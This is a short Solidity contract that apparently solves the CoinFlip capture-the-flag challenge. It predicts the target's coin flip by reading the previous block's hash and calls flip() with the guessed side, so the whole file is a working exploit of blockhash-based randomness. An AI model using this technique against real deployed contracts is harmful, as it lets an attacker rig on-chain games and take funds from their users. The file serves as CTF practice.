// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public challenge;

    constructor (address _coinFlipAddress) public {
        challenge = ICoinFlip(_coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // just use normal arithmetic directly, no SafeMath
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }
    receive() external payable {}
}